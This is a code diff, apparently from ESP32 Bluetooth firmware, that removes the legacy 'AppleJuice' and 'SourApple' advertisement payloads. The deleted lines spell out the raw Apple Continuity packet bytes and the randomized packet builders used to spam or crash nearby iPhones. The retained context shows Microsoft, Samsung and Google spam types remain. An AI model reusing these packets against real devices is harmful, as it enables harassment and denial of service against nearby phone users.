@@ -114,36 +114,14 @@ static bool isSamsungDevice(const String &mac) {
     return false;
 }
 
-// ============================================================================
-// Structs used by legacy paths
-// ============================================================================
-struct BLEData {
-    BLEAdvertisementData AdvData;
-    BLEAdvertisementData ScanData;
-};
 struct WatchModel {
     uint8_t value;
-};
-struct mac_addr {
-    unsigned char bytes[6];
-};
-struct Station {
-    uint8_t mac[6];
-    bool selected;
 };
 struct DeviceType {
     uint32_t value;
 };
 
-enum EBLEPayloadType { Microsoft, SourApple, AppleJuice, Samsung, Google };
-
-// ============================================================================
-// Apple Continuity — legacy static packets (used by AppleJuice legacy path)
-// ============================================================================
-const uint8_t IOS1[] = {
-    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
-};
-const uint8_t IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};
+enum EBLEPayloadType { Microsoft, Samsung, Google };
 
 // Apple Continuity — Nearby Action type codes
 static const uint8_t continuity_na_actions[] = {
@@ -266,59 +244,6 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String 
             AdvData.addData(AdvData_Raw, 7 + name_len);
 #else
             advDataVector.assign(AdvData_Raw, AdvData_Raw + 7 + name_len);
-            AdvData.addData(advDataVector);
-#endif
-            break;
-        }
-        case AppleJuice: {
-            int rand_val = random(2);
-            if (rand_val == 0) {
-                uint8_t packet[26] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
-                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-                                      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
-                                      0x00, 0x00};
-#ifdef NIMBLE_V2_PLUS
-                AdvData.addData(packet, 26);
-#else
-                advDataVector.assign(packet, packet + 26);
-                AdvData.addData(advDataVector);
-#endif
-            } else if (rand_val == 1) {
-                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
-                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
-                                      0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
-                                      0x00, 0x00};
-#ifdef NIMBLE_V2_PLUS
-                AdvData.addData(packet, 23);
-#else
-                advDataVector.assign(packet, packet + 23);
-                AdvData.addData(advDataVector);
-#endif
-            }
-            break;
-        }
-        case SourApple: {
-            uint8_t packet[17];
-            uint8_t j = 0;
-            packet[j++] = 16;
-            packet[j++] = 0xFF;
-            packet[j++] = 0x4C;
-            packet[j++] = 0x00;
-            packet[j++] = 0x0F;
-            packet[j++] = 0x05;
-            packet[j++] = 0xC1;
-            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
-            packet[j++] = types[random() % sizeof(types)];
-            esp_fill_random(&packet[j], 3);
-            j += 3;
-            packet[j++] = 0x00;
-            packet[j++] = 0x00;
-            packet[j++] = 0x10;
-            esp_fill_random(&packet[j], 3);
-#ifdef NIMBLE_V2_PLUS
-            AdvData.addData(packet, 17);
-#else
-            advDataVector.assign(packet, packet + 17);
             AdvData.addData(advDataVector);
 #endif
             break;
